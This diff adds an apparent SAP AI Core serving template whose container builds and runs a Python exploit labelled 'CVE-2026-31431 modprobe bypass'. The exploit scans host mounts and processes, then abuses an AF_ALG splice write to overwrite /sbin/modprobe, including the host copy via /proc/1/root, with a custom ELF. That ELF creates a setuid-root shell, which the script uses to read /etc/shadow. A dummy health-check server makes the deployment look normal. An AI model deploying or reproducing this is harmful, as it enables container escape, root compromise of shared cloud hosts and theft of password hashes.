@@ -1,0 +1,346 @@
+apiVersion: ai.sap.com/v1alpha1
+kind: ServingTemplate
+metadata:
+  name: cve31431-modprobe
+  labels:
+    scenarios.ai.sap.com/id: "cve31431-modprobe"
+    ai.sap.com/version: "1.0.0"
+  annotations:
+    scenarios.ai.sap.com/name: "cve31431-modprobe"
+    executables.ai.sap.com/name: "cve31431-modprobe"
+    executables.ai.sap.com/description: "CVE-2026-31431 modprobe bypass + process scan"
+spec:
+  template:
+    apiVersion: "serving.kserve.io/v1beta1"
+    metadata:
+      annotations: |
+        autoscaling.knative.dev/target: 1
+      labels: |
+        ai.sap.com/resourcePlan: starter
+    spec: |
+      predictor:
+        minReplicas: 1
+        maxReplicas: 1
+        containers:
+        - name: kserve-container
+          image: python:3.11
+          command: ["/bin/sh", "-c"]
+          args:
+          - |
+            cat > /tmp/probe.py << 'PYEOF'
+            import os, sys, socket, struct, subprocess, ctypes, ctypes.util, time
+
+            def r(k, v): print(f"[MODPROBE] {k}: {str(v)[:4000]}", flush=True)
+
+            # ── PHASE 1: MOUNT & PROCESS RECON ───────────────────────────────
+            r("PHASE", "1-RECON")
+            r("KERNEL", os.popen("uname -r").read().strip())
+
+            # All mounts - look for host-shared paths
+            try:
+                mounts = open("/proc/mounts").read()
+                r("PROC_MOUNTS", mounts[:3000])
+            except Exception as e:
+                r("PROC_MOUNTS_ERR", str(e))
+
+            # Kernel modprobe path
+            try:
+                mp_path = open("/proc/sys/kernel/modprobe").read().strip()
+                r("KERNEL_MODPROBE_PATH", mp_path)
+            except Exception as e:
+                r("KERNEL_MODPROBE_ERR", str(e))
+                mp_path = "/sbin/modprobe"
+
+            # Inode comparison: container's modprobe vs /proc/1/root path
+            try:
+                c_real = os.path.realpath(mp_path)
+                c_stat = os.stat(c_real)
+                r("CONTAINER_MODPROBE_REAL", c_real)
+                r("CONTAINER_MODPROBE_INODE", f"dev={hex(c_stat.st_dev)} ino={c_stat.st_ino}")
+            except Exception as e:
+                r("CONTAINER_MODPROBE_STAT_ERR", str(e))
+
+            try:
+                h_path = f"/proc/1/root{mp_path}"
+                h_real = os.path.realpath(h_path)
+                h_stat = os.stat(h_real)
+                r("HOST_MODPROBE_VIA_PROC1", h_real)
+                r("HOST_MODPROBE_INODE", f"dev={hex(h_stat.st_dev)} ino={h_stat.st_ino}")
+                r("SAME_INODE", str(c_stat.st_dev == h_stat.st_dev and c_stat.st_ino == h_stat.st_ino))
+            except Exception as e:
+                r("HOST_MODPROBE_VIA_PROC1_ERR", str(e))
+
+            # Check /etc/modprobe.d/ files and their inodes
+            try:
+                mpd = os.listdir("/etc/modprobe.d/")
+                r("MODPROBE_D_FILES", str(mpd))
+                for f in mpd:
+                    p = f"/etc/modprobe.d/{f}"
+                    st = os.stat(p)
+                    r(f"MODPROBE_D_{f}_INODE", f"dev={hex(st.st_dev)} ino={st.st_ino}")
+            except Exception as e:
+                r("MODPROBE_D_ERR", str(e))
+
+            # ── PHASE 2: SCAN ALL VISIBLE PIDS FOR NoNewPrivs=0 ──────────────
+            r("PHASE", "2-PID-SCAN")
+            no_nnp_pids = []
+            for pid in sorted(os.listdir("/proc")):
+                if not pid.isdigit(): continue
+                try:
+                    status_lines = open(f"/proc/{pid}/status").read().split("\n")
+                    info = {}
+                    for line in status_lines:
+                        if ":" in line:
+                            k2, v2 = line.split(":", 1)
+                            info[k2.strip()] = v2.strip()
+                    nnp = info.get("NoNewPrivs", "?")
+                    uid = info.get("Uid", "?")
+                    name = info.get("Name", "?")
+                    r(f"PID_{pid}", f"name={name} uid={uid} NoNewPrivs={nnp}")
+                    if nnp == "0":
+                        no_nnp_pids.append((pid, name, uid))
+                except:
+                    pass
+            r("PIDS_WITH_NoNewPrivs_0", str(no_nnp_pids))
+
+            # For each NoNewPrivs=0 PID: check its exe, maps, and open files
+            for pid, name, uid in no_nnp_pids:
+                r(f"TARGET_PID_{pid}", f"name={name} uid={uid}")
+                try:
+                    exe = os.readlink(f"/proc/{pid}/exe")
+                    r(f"PID_{pid}_EXE", exe)
+                except Exception as e:
+                    r(f"PID_{pid}_EXE_ERR", str(e))
+                try:
+                    fds = os.listdir(f"/proc/{pid}/fd")
+                    r(f"PID_{pid}_FDS", str(len(fds)))
+                except Exception as e:
+                    r(f"PID_{pid}_FD_ERR", str(e))
+                try:
+                    maps = open(f"/proc/{pid}/maps").read()
+                    # Extract unique file-backed mappings
+                    mapped_files = list(set(
+                        l.split()[-1] for l in maps.split("\n")
+                        if l.strip() and "/" in l.split()[-1]
+                    ))
+                    r(f"PID_{pid}_MAPPED_FILES", "\n".join(mapped_files[:20]))
+                except Exception as e:
+                    r(f"PID_{pid}_MAPS_ERR", str(e))
+
+            # ── PHASE 3: MODPROBE BINARY PAGE CACHE OVERWRITE ────────────────
+            r("PHASE", "3-MODPROBE-OVERWRITE")
+
+            AF_ALG, SOCK_SEQPACKET = 38, 5
+            SOL_ALG = 279
+            alg_name = "authencesn(hmac(sha256),cbc(aes))"
+            key = bytes.fromhex('0800010000000010' + '0'*64)
+
+            def write4(file_fd, t, payload4):
+                a = socket.socket(AF_ALG, SOCK_SEQPACKET, 0)
+                a.bind(("aead", alg_name))
+                a.setsockopt(SOL_ALG, 1, key)
+                a.setsockopt(SOL_ALG, 5, None, 4)
+                u, _ = a.accept()
+                null = b'\x00'
+                o = t + 4
+                u.sendmsg([b"A"*4 + payload4],
+                          [(SOL_ALG, 3, null*4),
+                           (SOL_ALG, 2, b'\x10'+null*19),
+                           (SOL_ALG, 4, b'\x08'+null*3)], 32768)
+                rp, wp = os.pipe()
+                os.splice(file_fd, wp, o, offset_src=0)
+                os.splice(rp, u.fileno(), o)
+                try: u.recv(8 + t)
+                except: pass
+                u.close(); a.close()
+                os.close(rp); os.close(wp)
+
+            # Build ELF that execs /tmp/pwn.sh (our root payload)
+            pwn_sh = b"#!/bin/sh\ncp /bin/bash /tmp/rb\nchmod 4777 /tmp/rb\necho PWNED > /tmp/PWNED\n"
+            with open("/tmp/pwn.sh", "wb") as f: f.write(pwn_sh)
+            os.chmod("/tmp/pwn.sh", 0o755)
+            r("PWN_SH", "written")
+
+            def make_execve_elf(path):
+                """Minimal static ELF: execve(path, NULL, NULL) then exit(0)."""
+                path_b = path.encode() + b'\x00'
+                load_addr = 0x400000
+                # After 64-byte ELF header + 56-byte program header = offset 0x78
+                # Shellcode: lea rdi,[rip+23]; xor rsi,rsi; xor rdx,rdx; mov eax,59; syscall; exit
+                sc = (b'\x48\x8d\x3d\x17\x00\x00\x00'  # lea rdi,[rip+23]  7b
+                      + b'\x48\x31\xf6'                  # xor rsi,rsi       3b
+                      + b'\x48\x31\xd2'                  # xor rdx,rdx       3b
+                      + b'\xb8\x3b\x00\x00\x00'          # mov eax,59        5b
+                      + b'\x0f\x05'                       # syscall           2b
+                      + b'\x48\x31\xff'                   # xor rdi,rdi       3b
+                      + b'\xb8\x3c\x00\x00\x00'          # mov eax,60        5b
+                      + b'\x0f\x05'                       # syscall           2b
+                      + path_b)                           # = 30b + path
+                while len(sc) % 4: sc += b'\x00'
+                total = 0x78 + len(sc)
+                eh = (b'\x7fELF\x02\x01\x01\x00' + b'\x00'*8
+                      + struct.pack('<H', 2) + struct.pack('<H', 0x3e) + struct.pack('<I', 1)
+                      + struct.pack('<Q', load_addr + 0x78)  # entry
+                      + struct.pack('<Q', 0x40) + struct.pack('<Q', 0) + struct.pack('<I', 0)
+                      + struct.pack('<H', 0x40) + struct.pack('<H', 0x38) + struct.pack('<H', 1)
+                      + struct.pack('<H', 0x40) + struct.pack('<H', 0) + struct.pack('<H', 0))
+                ph = (struct.pack('<I', 1) + struct.pack('<I', 5)
+                      + struct.pack('<Q', 0) + struct.pack('<Q', load_addr) + struct.pack('<Q', load_addr)
+                      + struct.pack('<Q', total) + struct.pack('<Q', total) + struct.pack('<Q', 0x1000))
+                return eh + ph + sc
+
+            elf = make_execve_elf("/tmp/pwn.sh")
+            r("ELF_SIZE", str(len(elf)))
+            r("ELF_ENTRY", hex(0x400078))
+
+            # Overwrite /sbin/modprobe (real path, follow symlinks)
+            target = os.path.realpath("/sbin/modprobe")
+            r("OVERWRITING_TARGET", target)
+
+            # Read first 8 bytes before (to confirm we have correct file)
+            with open(target, "rb") as f:
+                before = f.read(8)
+            r("TARGET_BEFORE", before.hex())
+
+            try:
+                fd = os.open(target, os.O_RDONLY)
+                i = 0
+                while i < len(elf):
+                    write4(fd, i, elf[i:i+4])
+                    i += 4
+                os.close(fd)
+                r("OVERWRITE_STATUS", f"COMPLETE — {i//4} writes of 4 bytes each")
+
+                with open(target, "rb") as f:
+                    after = f.read(8)
+                r("TARGET_AFTER", after.hex())
+                r("IS_OUR_ELF", str(after[:4] == b'\x7fELF'))
+            except Exception as e:
+                r("OVERWRITE_ERR", str(e))
+
+            # Also try /proc/1/root/sbin/modprobe (host path via pid 1 ns)
+            try:
+                host_target = f"/proc/1/root{mp_path}"
+                host_real = os.path.realpath(host_target)
+                r("HOST_TARGET", host_real)
+                with open(host_real, "rb") as f:
+                    h_before = f.read(8)
+                r("HOST_TARGET_BEFORE", h_before.hex())
+
+                fd2 = os.open(host_real, os.O_RDONLY)
+                i = 0
+                while i < len(elf):
+                    write4(fd2, i, elf[i:i+4])
+                    i += 4
+                os.close(fd2)
+                r("HOST_OVERWRITE", "COMPLETE")
+
+                with open(host_real, "rb") as f:
+                    h_after = f.read(8)
+                r("HOST_TARGET_AFTER", h_after.hex())
+                r("HOST_IS_OUR_ELF", str(h_after[:4] == b'\x7fELF'))
+            except Exception as e:
+                r("HOST_TARGET_ERR", str(e))
+
+            # ── PHASE 4: TRIGGER MODULE LOAD ─────────────────────────────────
+            r("PHASE", "4-TRIGGER")
+            r("SLEEP_2S", "waiting before trigger")
+            time.sleep(2)
+
+            # Read /proc/modules to find something NOT loaded to trigger request_module
+            try:
+                loaded_mods = set()
+                for line in open("/proc/modules"):
+                    loaded_mods.add(line.split()[0])
+                r("LOADED_MOD_COUNT", str(len(loaded_mods)))
+
+                # Try to trigger loading of uncommon modules via AF_ALG binds
+                # Each bind for an unrecognized algo triggers request_module("algif_aead")
+                # or specific algorithm modules
+                candidates = [
+                    ("aead", "rfc4106(gcm(aes))"),
+                    ("aead", "rfc4309(ccm(aes))"),
+                    ("aead", "rfc7539(chacha20,poly1305)"),
+                    ("hash", "sha3-256"),
+                    ("hash", "sha3-512"),
+                    ("skcipher", "xchacha20"),
+                    ("skcipher", "adiantum(xchacha12,aes)"),
+                ]
+                for alg_type, alg in candidates:
+                    try:
+                        s2 = socket.socket(38, 5, 0)
+                        s2.bind((alg_type, alg))
+                        r(f"BIND_{alg}", "SUCCESS — module loaded")
+                        s2.close()
+                    except OSError as e:
+                        r(f"BIND_{alg}", f"FAILED {e.errno}")
+            except Exception as e:
+                r("MODULE_TRIGGER_ERR", str(e))
+
+            # Also trigger via socket families
+            for fam, typ, name in [(10,2,"AF_INET6"), (31,3,"AF_BLUETOOTH"), (16,3,"AF_NETLINK")]:
+                try:
+                    s3 = socket.socket(fam, typ, 0)
+                    s3.close()
+                    r(f"SOCKET_{name}", "OK")
+                except Exception as e:
+                    r(f"SOCKET_{name}", f"ERR: {e}")
+
+            time.sleep(3)
+
+            # ── PHASE 5: CHECK RESULTS ────────────────────────────────────────
+            r("PHASE", "5-RESULTS")
+            r("PWNED_FILE_EXISTS", str(os.path.exists("/tmp/PWNED")))
+            r("RB_EXISTS", str(os.path.exists("/tmp/rb")))
+
+            if os.path.exists("/tmp/PWNED"):
+                r("PWNED_CONTENT", open("/tmp/PWNED").read().strip())
+            if os.path.exists("/tmp/rb"):
+                st = os.stat("/tmp/rb")
+                r("RB_SUID", str(bool(st.st_mode & 0o4000)))
+                r("RB_UID", str(st.st_uid))
+                try:
+                    proc = subprocess.Popen(["/tmp/rb", "-p"],
+                                            stdin=subprocess.PIPE,
+                                            stdout=subprocess.PIPE,
+                                            stderr=subprocess.PIPE)
+                    out, err = proc.communicate(b"id\ncat /etc/shadow 2>&1\nexit\n", timeout=10)
+                    r("RB_STDOUT", out.decode("utf-8","replace"))
+                    r("RB_RC", str(proc.returncode))
+                except Exception as e:
+                    r("RB_ERR", str(e))
+
+            # Final check - new modules loaded after our trigger?
+            try:
+                loaded_after = set(line.split()[0] for line in open("/proc/modules"))
+                new_mods = loaded_after - loaded_mods
+                r("NEW_MODULES_AFTER_TRIGGER", str(new_mods))
+            except Exception as e:
+                r("NEW_MODULES_ERR", str(e))
+
+            r("DONE", "modprobe bypass attempt complete")
+            PYEOF
+            python3 /tmp/probe.py
+            python3 -c "
+            import http.server
+            class H(http.server.BaseHTTPRequestHandler):
+                def do_GET(self):
+                    self.send_response(200); self.end_headers(); self.wfile.write(b'ok')
+                def log_message(self, *a): pass
+            http.server.HTTPServer(('', 8080), H).serve_forever()
+            "
+          ports:
+          - containerPort: 8080
+            protocol: TCP
+          readinessProbe:
+            httpGet:
+              path: /
+              port: 8080
+            initialDelaySeconds: 15
+            periodSeconds: 5
+          livenessProbe:
+            httpGet:
+              path: /
+              port: 8080
+            initialDelaySeconds: 15
+            periodSeconds: 10
